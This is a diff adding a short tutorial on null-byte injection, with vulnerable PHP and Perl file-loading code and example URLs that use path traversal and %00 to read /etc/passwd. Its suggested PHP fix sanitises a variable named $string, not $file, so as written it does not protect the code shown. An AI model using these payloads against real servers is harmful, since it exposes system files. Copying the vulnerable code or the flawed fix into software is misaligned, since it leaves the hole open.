@@ -1,0 +1,41 @@
+-- PHP --
+
+Null Bytes are an older exploit. It works by injecting a "Null Character" into a URL to alter string termination and get information or undesirable output (which is desirable for the malicious user).
+
+Here is the PHP code example that we will exploit:
+
+$file = $_GET['file'];
+require_once("/var/www/images/$file.jpg");
+
+This is what the URL extension would normally look like:
+
+.php?file=file.jpg 
+
+This is calling "file.jpg" from the server and displaying it to the webpage. We would exploit it like so by adding the Null Byte to the end of a local/remote file call:
+
+.php?file=[file inclusion here]%00 
+
+Example:
+
+.php?file=../../../../../../etc/passwd%00
+
+
+Fix your PHP code
+
+$file = str_replace(chr(0), '', $string);
+
+
+
+-- Perl --
+
+Here's the Perl counter-part to the example above:
+
+    $buffer = $ENV{'QUERY_STRING'};
+    $buffer =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+    $fn = '/home/userx/data/' .$buffer. '.jpg';
+    open (FILE,"<$fn");
+
+Here's how it would be exploited:
+
+    read.pl?page=../../../../etc/passwd%00jpg
+
